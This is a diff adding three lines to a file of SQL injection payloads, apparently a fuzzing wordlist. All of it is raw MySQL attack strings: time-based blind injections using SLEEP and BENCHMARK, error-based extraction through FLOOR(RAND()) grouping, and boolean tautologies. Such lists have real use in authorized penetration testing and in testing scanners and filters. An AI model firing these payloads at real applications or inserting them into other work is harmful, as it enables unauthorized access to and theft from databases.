@@ -1,7 +1,9 @@
 ' AND (SELECT 4384 FROM (SELECT(SLEEP(1)))ipsz)-- zfhm
 ' and 0=benchmark(1000000,MD5(1))%20%23
 ' OR (SELECT 2785 FROM(SELECT COUNT(*),CONCAT(0x71716b7171,(SELECT (ELT(2785=2785,1))),0x717a787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IEQA
+' OR 1 GROUP BY CONCAT_WS(0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))HAVING(MIN(0))-- wXyW
 ' or benchmark(1000000,MD5(1))#
+' OR NOT 03781=3781-- wXyW
 ' OR NOT 4238=4238#
 ' or sleep(1)#
 ' or true--
@@ -15,6 +17,7 @@
 '))) and 0=benchmark(1000000,MD5(1))%20%23
 '+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
 '+(select(0)from(select(sleep(1)))v)+'
+'XOR(if(now()=sysdate(),SLEEP(6),0))XOR'Z
 " and 0=benchmark(1000000,MD5(1))%20%23
 " or benchmark(1000000,MD5(1))#
 " or sleep(1)#
